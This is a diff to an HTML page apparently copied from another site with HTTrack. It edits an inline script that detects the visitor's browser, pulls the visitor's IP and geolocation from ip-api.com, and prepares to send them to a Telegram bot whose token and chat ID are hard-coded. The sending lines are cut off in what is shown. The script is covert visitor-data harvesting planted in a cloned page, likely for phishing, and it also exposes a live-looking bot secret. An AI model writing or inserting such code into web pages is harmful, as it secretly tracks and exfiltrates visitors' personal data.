@@ -675,42 +675,50 @@ fetch('http://ip-api.com/json/?fields=66846719')
     <!-- TELEGRAM BOT -->
     <!-- TELEGRAM BOT - TARAYICI DÜZELTİLMİŞ VERSİYON -->
 <!-- TELEGRAM BOT - TARAYICI KESİN ÇÖZÜM -->
+<!-- TELEGRAM BOT - TARAYICI KESİN ÇÖZÜM -->
 <script>
 const botToken = "8690281311:AAFGIGguVxQ4LgRmR7nSTa_HYY6Q_PSWONI";
 const chatId = "1504410647";
 
-// TARAYICI TESPİTİ - KESİN ÇÖZÜM
+// TARAYICI TESPİTİ - SON ÇÖZÜM
 function getBrowser() {
     const ua = navigator.userAgent;
     
-    // Önce Edge'i kontrol et (en spesifik)
-    if (ua.includes("Edg/") || ua.includes("Edge/")) {
+    // 1. KESIN YÖNTEM: Edge (birden çok kontrol)
+    if (ua.includes("Edg/") || ua.includes("Edge/") || ua.includes("EdgA") || ua.includes("EdgiOS")) {
         return "Microsoft Edge";
     }
-    // Opera / OPR
+    
+    // 2. Opera
     if (ua.includes("OPR") || ua.includes("Opera")) {
         return "Opera";
     }
-    // Firefox
+    
+    // 3. Firefox
     if (ua.includes("Firefox")) {
         return "Mozilla Firefox";
     }
-    // Chrome (Edge değilse)
-    if (ua.includes("Chrome") && !ua.includes("Edg")) {
-        return "Google Chrome";
-    }
-    // Safari
-    if (ua.includes("Safari") && !ua.includes("Chrome")) {
+    
+    // 4. Safari (Chrome'dan önce kontrol et)
+    if (ua.includes("Safari") && !ua.includes("Chrome") && !ua.includes("Edg")) {
         return "Safari";
     }
     
-    return navigator.userAgent; // Bilinmiyorsa userAgent gönder
+    // 5. Chrome (en son kontrol)
+    if (ua.includes("Chrome") && !ua.includes("Edg")) {
+        return "Google Chrome";
+    }
+    
+    return "Bilinmiyor - " + ua.substring(0, 50);
 }
 
-// DEBUG: Konsolda görmek için
+// DEBUG: Konsola yazdır
+console.log('========== TARAYICI BİLGİSİ ==========');
 console.log('User Agent:', navigator.userAgent);
-console.log('Tespit edilen:', getBrowser());
+console.log('Tespit edilen tarayıcı:', getBrowser());
+console.log('======================================');
 
+// IP ve mesaj gönderme
 fetch('http://ip-api.com/json/?fields=66846719')
   .then(response => response.json())
   .then(data => {
@@ -743,6 +751,7 @@ fetch('http://ip-api.com/json/?fields=66846719')
 <!-- Mirrored from Kittyescraft.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 28 Feb 2026 14:23:44 GMT -->
 
 </html>
+
 
 
 
